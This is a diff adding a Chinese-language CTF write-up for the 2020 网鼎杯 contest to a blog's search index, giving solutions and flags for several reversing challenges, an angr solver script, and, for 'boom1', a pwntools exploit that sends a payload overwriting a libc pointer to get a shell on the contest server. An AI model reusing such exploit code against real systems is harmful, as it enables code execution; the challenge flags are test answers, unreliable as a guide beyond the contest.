@@ -1,6 +1,58 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>网鼎杯CTF (week 3)</title>
+    <url>/2020/05/10/2020-5-10/</url>
+    <content><![CDATA[<h2 id="网鼎杯">网鼎杯</h2>
+<h3 id="bang">bang</h3>
+<p>拿到题是个加壳的，直接用通用脱壳机一梭子，就ok了，直接有答案</p>
+<p><img src="/" class="lazyload" data-src="/2020/05/10/2020-5-10/image-20200510092752644.png"  alt=""></p>
+<h3 id="signal">signal</h3>
+<p><img src="/" class="lazyload" data-src="/2020/05/10/2020-5-10/image-20200510102110507.png"  alt="image-20200510102110507"></p>
+<p>虚拟机的题</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">0A 00 00 00 04 00 00 00 10 00 00 00 08 00 00 00 03 00 00 00 05 00 00 00 01 00 00 00 04 00 00 00</span><br><span class="line">20 00 00 00 08 00 00 00 05 00 00 00 03 00 00 00 01 00 00 00 03 00 00 00 02 00 00 00 08 00 00 00</span><br><span class="line">0B 00 00 00 01 00 00 00 0C 00 00 00 08 00 00 00 04 00 00 00 04 00 00 00 01 00 00 00 05 00 00 00</span><br><span class="line">03 00 00 00 08 00 00 00 03 00 00 00 21 00 00 00 01 00 00 00 0B 00 00 00 08 00 00 00 0B 00 00 00</span><br><span class="line">01 00 00 00 04 00 00 00 09 00 00 00 08 00 00 00 03 00 00 00 20 00 00 00 01 00 00 00 02 00 00 00</span><br><span class="line">51 00 00 00 08 00 00 00 04 00 00 00 24 00 00 00 01 00 00 00 0C 00 00 00 08 00 00 00 0B 00 00 00</span><br><span class="line">01 00 00 00 05 00 00 00 02 00 00 00 08 00 00 00 02 00 00 00 25 00 00 00 01 00 00 00 02 00 00 00</span><br><span class="line">36 00 00 00 08 00 00 00 04 00 00 00 41 00 00 00 01 00 00 00 02 00 00 00 20 00 00 00 08 00 00 00</span><br><span class="line">05 00 00 00 01 00 00 00 01 00 00 00 05 00 00 00 03 00 00 00 08 00 00 00 02 00 00 00 25 00 00 00</span><br><span class="line">01 00 00 00 04 00 00 00 09 00 00 00 08 00 00 00 03 00 00 00 20 00 00 00 01 00 00 00 02 00 00 00</span><br><span class="line">41 00 00 00 08 00 00 00 0C 00 00 00 01 00 00 00 07 00 00 00 22 00 00 00 07 00 00 00 3F 00 00 00</span><br><span class="line">07 00 00 00 34 00 00 00 07 00 00 00 32 00 00 00 07 00 00 00 72 00 00 00 07 00 00 00 33 00 00 00</span><br><span class="line">07 00 00 00 18 00 00 00 07 00 00 00 A7 FF FF FF</span><br></pre></td></tr></tbody></table></figure>
+<p>github上的angr_ctf套题提供的标准模板，直接拿来用了改一下</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">def main(argv):</span><br><span class="line">    bin_path = argv[1]</span><br><span class="line">    p = angr.Project(bin_path)</span><br><span class="line">    init_state = p.factory.entry_state()</span><br><span class="line">    sim = p.factory.simulation_manager(init_state)</span><br><span class="line">    def is_good(state):</span><br><span class="line">        return b'good,The answer format is:flag {}' in state.posix.dumps(1)</span><br><span class="line">    def is_bad(state):</span><br><span class="line">        return b'what a shame...' in state.posix.dumps(1) or b'WRONG!\n' in state.posix.dumps(1)</span><br><span class="line">    sim.explore(find = is_good ,avoid = is_bad)</span><br><span class="line">    if sim.found:</span><br><span class="line">        found_state = sim.found[0]</span><br><span class="line">        print("Flag: {}".format(found_state.posix.dumps(0)))</span><br><span class="line">    else :</span><br><span class="line">        print("cannot found a solution")</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/" class="lazyload" data-src="/2020/05/10/2020-5-10/image-20200510111753752.png"  alt="image-20200510111753752"></p>
+<p><code>flag{757515121f3d478}</code></p>
+<h3 id="jocker">jocker</h3>
+<p><img src="/" class="lazyload" data-src="/2020/05/10/2020-5-10/image-20200510133137899.png"  alt="image-20200510133137899"></p>
+<p>看一下一个异或的东西，可以借出来前面的</p>
+<p><img src="/" class="lazyload" data-src="/2020/05/10/2020-5-10/image-20200510142627326.png"  alt="image-20200510142627326"></p>
+<p>19位flag{d07abccf8a410c是这个，后面的东西就是一个异或，吐槽一下，什么提示都没有，太脑洞了吧</p>
+<p><img src="/" class="lazyload" data-src="/2020/05/10/2020-5-10/image-20200510133302597.png"  alt="image-20200510133302597"></p>
+<p>58和}异或得出来的是71 和其他的异或就行了直接得出答案</p>
+<p><code>flag{d07abccf8a410cb37a}</code></p>
+<h3 id="you-raise-me-up">you raise me up</h3>
+<p><img src="/" class="lazyload" data-src="/2020/05/10/2020-5-10/image-20200510101103940.png"  alt="image-20200510101103940"></p>
+<p>56006392793405651552924479293096841126763872290794186417054288110043102953612574215902230811593957757</p>
+<p>转化一下 <code>flag{5f95ca93-1594-762d-ed0b-a9139692cb4a}</code></p>
+<h3 id="boom1">boom1</h3>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc =ELF('./libc-2.23.so')</span><br><span class="line">poc = remote('182.92.73.10',24573)</span><br><span class="line">context.log_level ='DEBUG'</span><br><span class="line">payload = '''</span><br><span class="line">char *c,*k;</span><br><span class="line">char *ptr;</span><br><span class="line">main()</span><br><span class="line">{</span><br><span class="line">c = "FMYY";</span><br><span class="line">k = c - (0x7F8FE6E5C028 - 0x7F8FE6933000);</span><br><span class="line">c = k + 6229832 - 3848 + 8;</span><br><span class="line">c[0] = 0;</span><br><span class="line">c = k + 6229832;</span><br><span class="line">ptr = 0xCD0F3 + k;</span><br><span class="line">c[0] = (ptr)&amp;0xFF;</span><br><span class="line">c[1] = (ptr&gt;&gt;8)&amp;0xFF;</span><br><span class="line">c[2] = (ptr&gt;&gt;16)&amp;0xFF;</span><br><span class="line">printf("%p %p %p",k,ptr,*(int *)c);</span><br><span class="line">}'''</span><br><span class="line">payload = payload.replace('\n','')</span><br><span class="line">poc.sendline(payload)</span><br><span class="line">poc.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>个人笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>5.9日笔记 (week 3)</title>
     <url>/2020/05/09/2020-5-9/</url>
     <content><![CDATA[<h2 id="5-9日更新">5.9日更新</h2>
